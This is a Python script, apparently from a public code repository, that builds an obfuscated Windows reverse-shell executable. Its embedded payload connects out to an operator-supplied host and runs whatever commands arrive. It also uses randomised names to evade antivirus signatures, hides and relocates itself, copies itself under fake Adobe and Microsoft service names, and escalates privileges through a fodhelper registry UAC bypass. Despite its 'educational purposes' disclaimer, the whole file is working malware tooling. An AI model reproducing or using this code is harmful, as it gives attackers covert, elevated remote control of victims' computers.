"""
Copyright (c) 2020 LcGk

 Permission is hereby granted, free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
 in the Software without restriction, including without limitation the rights
 to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 copies of the Software, and to permit persons to whom the Software is
 furnished to do so, subject to the following conditions:

 The above copyright notice and this permission notice shall be included in
 all copies or substantial portions of the Software.

 THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 THE SOFTWARE.


Other infos:
    Script developed for educational and explanatory purposes only. Its use is the user's responsibility.
    Random variable/function/import names are used to avoid signature detection.
"""

title = """
.-= Python Reverse Shell =-.
          By LcGk
"""

from random import choice, randint as r
from colorama import Fore
from base64 import b64encode
import os
from shutil import rmtree
import subprocess
from time import sleep

def genRandChars(l):
    c = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(choice(c) for x in range(l))

def sysName():
    names = ["Adobe Runtime", "Windows Assistant", "Windows Live Service", "Microsoft WebService", "Microsoft Helper", "Microsoft Utility", "Explorer Settings", "Adobe Updater", "Adobe Assistance",
             "Microsoft Technology Helper", "Windows Utility", "COM Surrogate", "Windows Health Service"]
    return choice(names)


def main():
    global title
    question = Fore.LIGHTMAGENTA_EX
    advanced = Fore.LIGHTBLUE_EX
    warning = Fore.YELLOW
    info = Fore.LIGHTCYAN_EX
    success = Fore.LIGHTGREEN_EX
    reset = Fore.RESET

    print(success + title + reset)

    IP = b64encode(input(question +   "[?] LHOST » " + reset).encode())
    PORT = b64encode(input(question + "[?] LPORT » " + reset).encode())

    adOp = input(question + "[?] Enable advanced options? [y/N] » " + reset)
    advancedOp = False
    adOptions = {"initialSleep": 0.05, "hidenFile": False, "spawnOtherProcess": False, "StartWithWindows": False}

    if(adOp.lower() == "y"):
        advancedOp = True
        adOptions["initialSleep"] = float(input(advanced + "[Advanced] Seconds to sleep before running (allows float) » " + reset))
        adOptions["hidenFile"] = True if ((input(advanced + "[Advanced] Hide file? [y/N] » " + reset).lower() == "y")) else False
        adOptions["spawnOtherProcess"] = True if((input(advanced + "[Advanced] Spawn shell in another process? [y/N] » " + reset).lower() == "y")) else False
        # adOptions["StartWithWindows"] = True if ((input(advanced + "[Advanced] Start shell with windows [y/N] » " + reset).lower() == "y")) else False

    vars = {"socket": genRandChars(r(8, 12)), "subprocess": genRandChars(r(8, 12)), "os": genRandChars(r(8, 12)),
            "sleep": genRandChars(r(8, 12)), "sWith": genRandChars(r(12, 14)), "send": genRandChars(r(18, 24)),
            "recv": genRandChars(r(18, 24)), "s": genRandChars(r(6, 12)), "connected": genRandChars(r(16, 32)),
            "data": genRandChars(r(12, 14)), "p": genRandChars(r(4, 6)), "r": genRandChars(r(8, 10)), "b64": genRandChars(r(22, 36)),
            "host": genRandChars(r(48, 64)), "hideFile": genRandChars(r(26, 48)), "oProcess": genRandChars(r(40, 62)),
            "copy": genRandChars(r(14, 22)), "inOtherProcess": genRandChars(r(22, 44)), "bypassUAC": genRandChars(r(64, 96)), "winreg": genRandChars(r(14, 28)),
            "ctypes": genRandChars(r(18, 26))}

    bA = "{"
    bB = "}"

    shell = f"""

import socket as {vars["socket"]}, subprocess as {vars["subprocess"]}, os as {vars["os"]}, winreg as {vars["winreg"]};
from time import sleep as {vars["sleep"]};
from base64 import b64decode as {vars["b64"]};
import sys
from shutil import copy as {vars["copy"]}
import ctypes as {vars["ctypes"]}

{vars["sleep"]}({adOptions["initialSleep"]})

def getCPath():
    if(getattr(sys, 'frozen', False)):
        rPath = sys.executable
    else:
        rPath = {vars["os"]}.path.abspath(__file__)
    n = {vars["os"]}.path.basename(rPath)
    return [rPath, n]

def cFix():
    sInfo = {vars["subprocess"]}.STARTUPINFO()
    sInfo.dwFlags |= {vars["subprocess"]}.STARTF_USESHOWWINDOW
    
    args = {{'stdout': {vars["subprocess"]}.DEVNULL,
             'stderr': {vars["subprocess"]}.DEVNULL,
             'stdin':  {vars["subprocess"]}.DEVNULL,
             'startupinfo': sInfo,
             'env': {vars["os"]}.environ}}
    return args

def {vars["hideFile"]}():
    rPath, n = getCPath()
    {vars["subprocess"]}.call(["attrib", "+H", n, "/S"], **cFix())

    try:
        {vars["os"]}.rename(rPath, "C:\\\\ProgramData\\\\" + n)
    except:
        pass

if({adOptions["hidenFile"]}):
    {vars["hideFile"]}()

def isAdmin():
    try:
        return {vars["ctypes"]}.windll.shell32.IsUserAdmin()
    except:
        return False

def {vars["bypassUAC"]}(dir):
    if not (isAdmin()):
        try:
            rPath = 'Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command'

            {vars["winreg"]}.CreateKey({vars["winreg"]}.HKEY_CURRENT_USER, rPath)
            rKey = {vars["winreg"]}.OpenKey({vars["winreg"]}.HKEY_CURRENT_USER, rPath, 0, {vars["winreg"]}.KEY_WRITE)
            {vars["winreg"]}.SetValueEx(rKey, "DelegateExecute", 0, {vars["winreg"]}.REG_SZ, '')
            {vars["winreg"]}.CloseKey(rKey)

            {vars["sleep"]}(0.025)

            cmd = "C:\\\\Windows\\\\System32\\\\cmd.exe /k " + dir
            {vars["winreg"]}.CreateKey({vars["winreg"]}.HKEY_CURRENT_USER, rPath)
            rKey = {vars["winreg"]}.OpenKey({vars["winreg"]}.HKEY_CURRENT_USER, rPath, 0, {vars["winreg"]}.KEY_WRITE)
            {vars["winreg"]}.SetValueEx(rKey, None, 0, {vars["winreg"]}.REG_SZ, cmd)
            {vars["winreg"]}.CloseKey(rKey)

            {vars["sleep"]}(0.025)
            {vars["subprocess"]}.Popen(["C:\\\\Windows\\\\System32\\\\fodhelper.exe"], shell=False, stdout={vars["subprocess"]}.DEVNULL, stdin={vars["subprocess"]}.DEVNULL, stderr={vars["subprocess"]}.DEVNULL, close_fds=True)
            sys.exit()
        except:
            pass
    else:
        return

rPath, n = getCPath()
{vars["bypassUAC"]}(rPath)

{vars["inOtherProcess"]} = False
def {vars["oProcess"]}():
    global {vars["inOtherProcess"]}
    rPath, n = getCPath()

    nPath = "C:\\\\ProgramData\\\\{sysName()}.exe"

    if({vars["os"]}.path.exists(nPath)):
        if(n == {vars["os"]}.path.basename(nPath)):
            return

    try:
        try:
            {vars["copy"]}(rPath, nPath)
        except:
            pass
        {vars["sleep"]}(0.0025)
        {vars["subprocess"]}.Popen([nPath], shell=False, stdout={vars["subprocess"]}.DEVNULL, stdin={vars["subprocess"]}.DEVNULL, stderr={vars["subprocess"]}.DEVNULL, close_fds=True)
        {vars["inOtherProcess"]} = True
        {vars["sleep"]}(0.5)
    except:
        print("??")
    if({vars["inOtherProcess"]}):
        sys.exit()


if({adOptions["spawnOtherProcess"]}):
    {vars["oProcess"]}()

def {vars["sWith"]}(s, w):
    s = s.split(" ")
    if(s[0] == w):
        return True
    return False

def {vars["send"]}(s, m):
    m = (f"\\n[{bA}{vars["socket"]}.gethostname(){bB}]\\n" + m).encode('utf-8')
    s.send(m)

def {vars["recv"]}(s):
    return s.recv(2048).decode('utf-8').strip()

def {vars["host"]}():
    return (({vars["b64"]}({IP})).decode(), int(({vars["b64"]}({PORT})).decode()))

{vars["s"]} = {vars["socket"]}.socket({vars["socket"]}.AF_INET, {vars["socket"]}.SOCK_STREAM)
{vars["s"]}.settimeout(30)
{vars["connected"]} = False

while not {vars["connected"]}:
    try:
        {vars["s"]}.connect({vars["host"]}())
        {vars["send"]}({vars["s"]}, "Shell started.\\n -> ")
        {vars["connected"]} = True
    except {vars["socket"]}.timeout:
        pass
    except:
        {vars["sleep"]}(1)
    {vars["sleep"]}(0.5)

while {vars["connected"]}:
    {vars["s"]}.settimeout(60)
    try:
        {vars["data"]} = {vars["recv"]}({vars["s"]})
        if({vars["data"]}.lower() == "quit" or {vars["data"]}.lower() == "exit"):
            {vars["connected"]} = False
            break
        elif({vars["sWith"]}({vars["data"]}.lower(), "cd")):
            try:
                {vars["os"]}.chdir({vars["data"]}.replace("cd ", ""))
                {vars["send"]}({vars["s"]}, "New directory: " + {vars["os"]}.getcwd())
            except:
                {vars["send"]}({vars["s"]}, "Couldn't change directory.")
        elif({vars["data"]}.lower() == "ls"):
            {vars["send"]}({vars["s"]}, "Current directory: " + {vars["os"]}.getcwd())
        elif({vars["data"]}.lower() == "?" or {vars["data"]}.lower() == "help"):
            {vars["send"]}({vars["s"]}, "Command list:\\nquit or exit       Close shell process\\nPress ctrl+c       Close connection but shell still open\\ncd                 Change working directory\\nls                 Show current directory\\n? or help          Show command list\\nAny other command  System commands\\n")
        else:
            if(len({vars["data"]}) > 0):
                {vars["p"]} = {vars["subprocess"]}.Popen({vars["data"]}, shell=True, stdout={vars["subprocess"]}.PIPE, stdin={vars["subprocess"]}.PIPE, stderr={vars["subprocess"]}.PIPE)
                {vars["r"]} = {vars["p"]}.stdout.read().decode('utf-8', errors='replace') + "\\n Errors -> " + {vars["p"]}.stderr.read().decode('utf-8', errors='replace')
                {vars["send"]}({vars["s"]}, {vars["r"]})
            else:
                {vars["send"]}({vars["s"]}, "Invalid or blank command\\n")
        {vars["s"]}.send("\\n -> ".encode('utf-8'))
    except {vars["socket"]}.timeout:
        {vars["sleep"]}(0.5)
        pass
    except:
        {vars["connected"]} = False

{vars["s"]}.close()
"""
    
    # print(shell)
    # return

    print(warning + "[!] Attention! Wrinting the shell will override any other file in the folder \"shellpybuild\" (if any)" + reset)
    conf = input(question + "[?] Continue? [Y/n] » " + reset)
    if(conf.lower() == "n"):
        print("Action cancelled.")
        exit()

    print(info + "[i] Writing shell to file..." + reset)

    try:
        rmtree("shellpybuild")
    except Exception as err:
        pass
    
    sleep(1.5)
    os.mkdir("shellpybuild")
    os.chdir("shellpybuild")
    sFile = open("shell.py", "w")
    sFile.write(shell)
    sFile.close()
    
    print(info + "[i] Compiling to exe..." + reset)
    p = subprocess.call("python -m PyInstaller --noconsole --onefile shell.py -y", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    # subprocess.call("python -m PyInstaller --onefile shell.py -y", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    # os.system("cls")
    print(success + "[✓] Compiled." + reset)

    print(info + "[i] Removing files..." + reset)
    os.rename("dist/shell.exe", "shell.exe")
    sleep(1)
    try:
        rmtree("__pycache__")
        rmtree("build")
        rmtree("dist")
        os.remove("shell.py")
        os.remove("shell.spec")
    except Exception as err:
        pass
    print(success + "[✓] Shell created successfully. (Writen to shellpybuild/shell.exe)" + reset)


if __name__ == "__main__":
    main()
